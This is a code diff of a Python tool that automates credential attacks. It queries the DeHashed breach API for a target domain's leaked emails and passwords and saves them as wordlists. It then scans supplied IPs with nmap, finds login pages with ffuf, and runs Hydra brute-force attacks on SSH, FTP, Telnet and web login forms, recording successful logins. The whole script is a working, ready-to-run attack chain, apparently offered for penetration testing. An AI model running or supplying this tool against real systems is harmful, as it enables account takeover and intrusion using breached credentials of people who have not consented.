@@ -1,185 +1,196 @@
+#!/usr/bin/env python3
+
 import requests
 import subprocess
 import os
 import argparse
-from time import sleep
 import logging
 import json
+from time import sleep
 
-parser = argparse.ArgumentParser(description="Automated tool for leaked credentials search, open port scan, and brute-force attempts.")
-parser.add_argument("-d", "--domain", help="Domain to search in DeHashed")
-parser.add_argument("-e", "--email", help="DeHashed account email")
-parser.add_argument("-k", "--apikey", help="DeHashed API key")
-parser.add_argument("-ipfile", "--ipfile", help="File with list of IPs to scan")
-parser.add_argument("-v", "--verbose", action="store_true", help="Print verbose output")
-args = parser.parse_args()
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="Automated tool for leaked credentials search, open port scan, and brute-force attempts."
+    )
+    parser.add_argument("-d", "--domain", required=True, help="Domain to search in DeHashed")
+    parser.add_argument("-k", "--apikey", required=True, help="DeHashed API v2 key")
+    parser.add_argument("-ipfile", "--ipfile", required=True, help="File with list of IPs to scan")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Print verbose output")
+    return parser.parse_args()
 
-username_list_file = "usernames.txt"
-password_list_file = "passwords.txt"
-unsuccessful_log_file = "login_attempts.txt"
-successful_log_file = "successful_logins.txt"
-
+# Log configuration
 logging.basicConfig(level=logging.INFO)
 
-def query_dehashed(domain, email, apikey, verbose=False):
+# File paths
+USERNAME_FILE = "usernames.txt"
+PASSWORD_FILE = "passwords.txt"
+UNSUCCESSFUL_LOG = "login_attempts.txt"
+SUCCESSFUL_LOG = "successful_logins.txt"
+
+def query_dehashed(domain, api_key, verbose=False):
     entries = []
     page = 1
-    entries_per_page = 10000
+    per_page = 10000
+    api_url = "https://api.dehashed.com/v2/search"
 
     while True:
-        url = f"https://api.dehashed.com/search?query=domain:{domain}&size={entries_per_page}&page={page}"
-        headers = {"Accept": "application/json"}
-        response = requests.get(url, headers=headers, auth=(email, apikey))
+        payload = {
+            "query": f"domain:{domain}",
+            "page": page,
+            "size": per_page
+        }
+        headers = {
+            "Dehashed-Api-Key": api_key,
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+        }
 
         if verbose:
-            print(f"Response status code: {response.status_code}")
-            print(f"Response text: {response.text}")
+            print(f"[+] POST {api_url} | page {page} | size {per_page}")
+            print(f"    Payload: {payload}")
 
-        if response.status_code != 200:
-            print(f"Error querying DeHashed: {response.status_code} {response.text}")
+        resp = requests.post(api_url, json=payload, headers=headers)
+
+        if verbose:
+            print(f"    → {resp.status_code} {resp.reason}")
+            print(f"    Body preview: {resp.text[:200]}…")
+
+        if resp.status_code == 401:
+            logging.error("Authentication failed (401). Check your API key and subscription.")
+            break
+        if resp.status_code == 404:
+            logging.error("Search endpoint not found (404). Verify subscription & endpoint URL.")
+            break
+        if resp.status_code != 200:
+            logging.error(f"Unexpected HTTP {resp.status_code}: {resp.text}")
             break
 
-        try:
-            data = response.json()
-        except json.JSONDecodeError:
-            print("Error: Unable to parse JSON response from DeHashed API")
+        data = resp.json()
+        page_entries = data.get("entries", [])
+        if not page_entries:
+            if verbose:
+                print("[*] No more entries, stopping pagination.")
             break
 
-        if "entries" not in data or data["entries"] is None:
-            print(f"Unexpected response format or no entries found: {data}")
+        entries.extend(page_entries)
+
+        if len(page_entries) < per_page:
             break
 
-        if isinstance(data["entries"], list):
-            entries.extend(data["entries"])
-            print(f"Fetched {len(data['entries'])} entries from page {page}.")
-
-        if page * entries_per_page >= data["total"]:
-            break
-        else:
-            page += 1
-            sleep(0.2)
+        page += 1
+        sleep(0.2)
 
     print(f"Total entries fetched: {len(entries)}")
     return entries
 
 def save_credentials(entries):
-    usernames = set()
+    users = set()
     passwords = set()
 
     for entry in entries:
-        if "email" in entry:
-            username = entry["email"].split("@")[0]
-            usernames.add(username)
-        if "password" in entry:
-            passwords.add(entry["password"])
+        for mail in entry.get("email", []):
+            local = mail.split("@")[0]
+            users.add(local)
+        for pwd in entry.get("password", []):
+            passwords.add(pwd)
 
-    with open(username_list_file, "w") as f:
-        f.write("\n".join(usernames))
-    
-    with open(password_list_file, "w") as f:
-        f.write("\n".join(passwords))
+    with open(USERNAME_FILE, "w") as uf:
+        uf.write("\n".join(sorted(users)))
+    with open(PASSWORD_FILE, "w") as pf:
+        pf.write("\n".join(sorted(passwords)))
 
-    print(f"Saved {len(usernames)} usernames and {len(passwords)} passwords to text files.")
+    print(f"Saved {len(users)} usernames and {len(passwords)} passwords.")
 
 def log_unsuccessful_attempt(ip, port, service):
-    with open(unsuccessful_log_file, "a") as file:
-        file.write(f"Port {port} on {ip} - {service}: Logins unsuccessful\n")
+    with open(UNSUCCESSFUL_LOG, "a") as f:
+        f.write(f"Port {port} on {ip} - {service}: Logins unsuccessful\n")
 
 def log_successful_login(ip, port, service, username, password):
-    with open(successful_log_file, "a") as file:
-        file.write(f"Port {port} on {ip} - {service}: Successful login with {username}/{password}\n")
+    with open(SUCCESSFUL_LOG, "a") as f:
+        f.write(f"Port {port} on {ip} - {service}: Successful login with {username}/{password}\n")
 
 def scan_open_ports(ip):
     print(f"Scanning {ip} for open ports...")
     result = subprocess.run(
-        ["nmap", "-p22,21,23,80,443,8080,8443,10443", "--open", "-Pn", ip], capture_output=True, text=True
+        ["nmap", "-p22,21,23,80,443,8080,8443,10443", "--open", "-Pn", ip],
+        capture_output=True, text=True
     )
     return result.stdout
 
-def parse_nmap_result(scan_output):
+def parse_nmap_result(output):
     services = {"http": [], "ssh": False, "ftp": False, "telnet": False}
-    for line in scan_output.splitlines():
+    for line in output.splitlines():
         if "22/tcp open" in line:
             services["ssh"] = True
         elif "21/tcp open" in line:
             services["ftp"] = True
         elif "23/tcp open" in line:
             services["telnet"] = True
-        elif any(port in line for port in ["80/tcp open", "443/tcp open", "8080/tcp open", "8443/tcp open", "10443/tcp open"]):
+        elif any(p in line for p in ["80/tcp open", "443/tcp open", "8080/tcp open", "8443/tcp open", "10443/tcp open"]):
             services["http"].append(line.split("/")[0])
-
     return services
 
 def scan_for_login_pages(ip, port):
     protocol = "https" if port in ["443", "8443", "10443"] else "http"
-    ffuf_command = [
+    cmd = [
         "ffuf", "-u", f"{protocol}://{ip}:{port}/FUZZ", "-w", "common.txt",
-        "-mr", "login", "-o", f"ffuf_{ip}_{port}_results.json", "-t", "50", "-k"
+        "-mr", "login", "-o", f"ffuf_{ip}_{port}.json", "-t", "50", "-k"
     ]
-    print(f"Scanning {ip}:{port} for login pages with FFuf...")
-    subprocess.run(ffuf_command)
+    print(f"Scanning {ip}:{port} for login pages...")
+    subprocess.run(cmd)
 
-    if os.path.exists(f"ffuf_{ip}_{port}_results.json"):
-        with open(f"ffuf_{ip}_{port}_results.json", "r") as ffuf_results:
-            return any("login" in line for line in ffuf_results.readlines())
+    path = f"ffuf_{ip}_{port}.json"
+    if os.path.exists(path):
+        with open(path) as f:
+            return any("login" in line for line in f)
     return False
 
-def run_hydra(ip, service, port, username_list, password_list):
+def run_hydra(ip, service, port):
     if service == "http":
-        protocol = "https" if port in ["443", "8443", "10443"] else "http"
-        hydra_command = [
-            "hydra", "-L", username_list, "-P", password_list,
-            f"{protocol}-post-form", f"{ip}:{port}:/login.php:username=^USER^&password=^PASS^:Invalid credentials",
+        prot = "https" if port in ["443", "8443", "10443"] else "http"
+        cmd = [
+            "hydra", "-L", USERNAME_FILE, "-P", PASSWORD_FILE,
+            f"{prot}-post-form", f"{ip}:{port}:/login.php:username=^USER^&password=^PASS^:Invalid credentials",
             "-I", "-t", "4", "-vV"
         ]
-    elif service == "ssh":
-        hydra_command = ["hydra", "-L", username_list, "-P", password_list, "ssh", ip]
-    elif service == "ftp":
-        hydra_command = ["hydra", "-L", username_list, "-P", password_list, "ftp", ip]
-    elif service == "telnet":
-        hydra_command = ["hydra", "-L", username_list, "-P", password_list, "telnet", ip]
     else:
-        return
+        cmd = ["hydra", "-L", USERNAME_FILE, "-P", PASSWORD_FILE, service, ip]
 
     print(f"Running Hydra against {service} on {ip}:{port}...")
-    result = subprocess.run(hydra_command, capture_output=True, text=True)
-
-    if "login:" in result.stdout and "password:" in result.stdout:
-        try:
-            username = result.stdout.split("login: ")[1].split(" password: ")[0]
-            password = result.stdout.split("password: ")[1].split("\n")[0]
-            log_successful_login(ip, port, service, username, password)
-        except IndexError:
-            print(f"Error parsing Hydra output: {result.stdout}")
-            log_unsuccessful_attempt(ip, port, service)
+    res = subprocess.run(cmd, capture_output=True, text=True)
+    if "login:" in res.stdout and "password:" in res.stdout:
+        user = res.stdout.split("login: ")[1].split(" password:")[0]
+        pwd  = res.stdout.split("password: ")[1].split("\n")[0]
+        log_successful_login(ip, port, service, user, pwd)
     else:
         log_unsuccessful_attempt(ip, port, service)
 
 def main():
-    entries = query_dehashed(args.domain, args.email, args.apikey)
+    args = parse_args()
+
+    entries = query_dehashed(args.domain, args.apikey, args.verbose)
     if not entries:
         print("No entries found for the domain.")
         return
 
     save_credentials(entries)
 
-    with open(args.ipfile, "r") as f:
-        ip_addresses = f.read().splitlines()
+    with open(args.ipfile) as f:
+        ips = [line.strip() for line in f if line.strip()]
 
-    for ip in ip_addresses:
-        nmap_result = scan_open_ports(ip)
-        services = parse_nmap_result(nmap_result)
+    for ip in ips:
+        nmap_out = scan_open_ports(ip)
+        svcs = parse_nmap_result(nmap_out)
 
-        for port in services["http"]:
+        for port in svcs["http"]:
             if scan_for_login_pages(ip, port):
-                run_hydra(ip, "http", port, username_list_file, password_list_file)
+                run_hydra(ip, "http", port)
 
-        for service, is_open in services.items():
-            if service != "http" and is_open:
-                run_hydra(ip, service, "", username_list_file, password_list_file)
+        for svc, open_ in svcs.items():
+            if svc != "http" and open_:
+                run_hydra(ip, svc, "")
+
+    print("process Finished")
 
 if __name__ == "__main__":
     main()
-    os.system('echo "process Finished"')
-
-
